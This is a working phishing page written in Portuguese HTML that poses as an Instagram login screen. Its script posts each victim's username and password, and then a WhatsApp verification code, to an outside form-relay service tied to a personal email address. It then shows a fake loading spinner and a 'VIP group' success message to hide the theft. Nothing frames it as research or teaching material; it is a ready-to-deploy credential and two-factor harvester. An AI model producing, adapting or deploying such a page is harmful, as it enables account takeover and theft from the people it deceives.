<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Instagram</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
  <style>
    body {
      background-color: #fafafa;
      font-family: 'Roboto', sans-serif;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      flex-direction: column;
    }

    .container {
      background: white;
      padding: 40px 30px;
      border: 1px solid #ddd;
      text-align: center;
      width: 100%;
      max-width: 320px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.05);
      margin: auto;
    }

    .logo {
      width: 120px;
      margin-bottom: 25px;
    }

    input, button {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 14px;
      box-sizing: border-box;
    }

    button {
      background-color: #3897f0;
      color: white;
      font-weight: bold;
      cursor: pointer;
      border: none;
    }

    button:hover {
      background-color: #318bda;
    }

    .footer {
      font-size: 12px;
      color: #999;
      margin-top: 15px;
    }

    .hidden {
      display: none;
    }

    .loading img {
      width: 40px;
      margin-bottom: 10px;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container" id="login">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="logo" />
    <form id="loginForm">
      <input type="text" name="username" placeholder="Telefone, nome de usuário ou e-mail" required />
      <input type="password" name="password" placeholder="Senha" required />
      <button type="submit">Entrar</button>
    </form>
    <div class="footer">© 2025 Instagram from Meta</div>
  </div>

  <div class="container hidden" id="codigo">
    <h3>Verificação de segurança</h3>
    <p>Enviamos um código de 6 dígitos para seu WhatsApp.</p>
    <form id="codigoForm">
      <input type="text" name="codigo" placeholder="Digite o código do WhatsApp" required />
      <button type="submit">Confirmar</button>
    </form>
  </div>

  <div class="container hidden" id="carregando">
    <div class="loading">
      <img src="https://i.gifer.com/ZZ5H.gif" alt="Carregando" />
      <p>Verificando código...</p>
    </div>
  </div>

  <div class="container hidden" id="final">
    <h2>Parabéns!</h2>
    <p>Cadastro realizado com sucesso.</p>
    <p>Em alguns instantes, você será encaminhado para o nosso grupo VIP no WhatsApp.</p>
  </div>

  <script>
    const loginForm = document.getElementById("loginForm");
    const codigoForm = document.getElementById("codigoForm");

    loginForm.addEventListener("submit", function(e) {
      e.preventDefault();
      document.getElementById("login").classList.add("hidden");
      document.getElementById("codigo").classList.remove("hidden");

      const dados = new FormData(loginForm);
      fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
        method: "POST",
        headers: { 'Accept': 'application/json' },
        body: dados
      });
    });

    codigoForm.addEventListener("submit", function(e) {
      e.preventDefault();
      document.getElementById("codigo").classList.add("hidden");
      document.getElementById("carregando").classList.remove("hidden");

      const dadosCodigo = new FormData(codigoForm);
      fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
        method: "POST",
        headers: { 'Accept': 'application/json' },
        body: dadosCodigo
      });

      setTimeout(() => {
        document.getElementById("carregando").classList.add("hidden");
        document.getElementById("final").classList.remove("hidden");
      }, 2500);
    });
  </script>
</body>
</html>
